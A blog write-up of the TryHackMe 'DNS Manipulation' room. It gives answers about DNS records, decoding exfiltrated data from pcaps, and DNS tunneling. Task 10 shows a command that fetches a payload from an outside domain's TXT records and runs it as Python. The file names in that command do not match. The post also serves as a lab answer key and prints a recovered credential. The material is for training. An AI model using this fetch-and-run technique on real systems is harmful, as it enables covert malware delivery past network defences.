---
title: "THM | DNS Manipulation"
date: 2022-04-17
type: "post"
url : "/write-ups/dnsmanipulation/"
showtableOfContents: true
---

## Room

https://tryhackme.com/room/dnsmanipulation

## Task 1: Introduction

*No answer needed*

## Task 2:  Installation

*No answer needed*

## Task 3: [Setup] Custom Public DNS Server

*No answer needed*

## Task 4: What is DNS? 

#### Question 1: If you were on Windows, what command could you use to query a txt record for "youtube.com"?

*~ nslookup -type=txt youtube.com*

#### Question 2: If you were on Linux, what command could you use to query a txt record for 'facebook.com'?

*~ dig facebook.com TXT*

#### Question 3: AAAA stores what type of IP Address along with the hostname?

*~ IPv6*

#### Question 4: Maximum characters for a DNS TXT Record is 256. (Yay/Nay)

*~ Nay*

#### Question 5: What DNS Record provides a domain name in reverse-lookup? (Research)

*~ PTR*

#### Question 6: What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)

*~ 2.203.168.192.in-addr.arpa*

```bash
nslookup 192.168.203.2
```

![source](/img/write-ups/2022/dnsmanipulation/2022.png

## Task 5: What is DNS Exfiltration? 

#### Question 1: What is the maximum length of a DNS name? (Research) (Length includes dots!)

*~ 253*

## Task 6: DNS Exfiltration - Demo

*No answer needed*

## Task 7: DNS Exfiltration - Practice

```bash
cd ~/challenges/exfiltration/orderlist/
python3 ~/dns-exfil-infil/packetyGrabber.py order.pcap
cat order.txt
```

![source](/img/write-ups/2022/dnsmanipulation/2022_1.png)

![source](/img/write-ups/2022/dnsmanipulation/2022_2.png)

#### Question 1: What is the Transaction name? (Type it as you see it)

*~ Network Equip.*

#### Question 2: How much was the Firewall? (Without the $)

*~ 2500*

#### Question 3: Which file contain suspicious DNS queries? 

*~ cap3.pcap*

#### Question 4: Enter the plain-text after you have decoded the data using packetyGrabber.py found in ~/dns-exfil-infil/ folder.

*~ administrator:s3cre7P@ssword*

```bash
cd ../identify/
python3 ~/dns-exfil-infil/packetyGrabber.py cap3.pcap
cat cap.txt
```

![source](/img/write-ups/2022/dnsmanipulation/2022_3.png)

## Task 8: What is DNS Infiltration?

#### Question 1: What type of DNS Record is usually used to infiltrate data into a network?

*~ txt*

## Task 9: DNS Infiltration - Demo

*No answer needed*

## Task 10: DNS Infiltration - Practice

*~ 4.4.0-186-generic*

```bash
nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \* -f2 > .mail.python3
python3 ~/dns-exfil-infil/packetySimple.py 
python3 .mal.py
```

![source](/img/write-ups/2022/dnsmanipulation/2022_4.png)

## Task 11: DNS Tunneling

#### Question 1: What program was used to Tunnel HTTP over DNS?

*~ iodine*

## Task 12: The End

*No answer needed*

that's it ✌🏽

-------------------------------------------------------------
{{< rawhtml >}} 
 
{{< /rawhtml >}}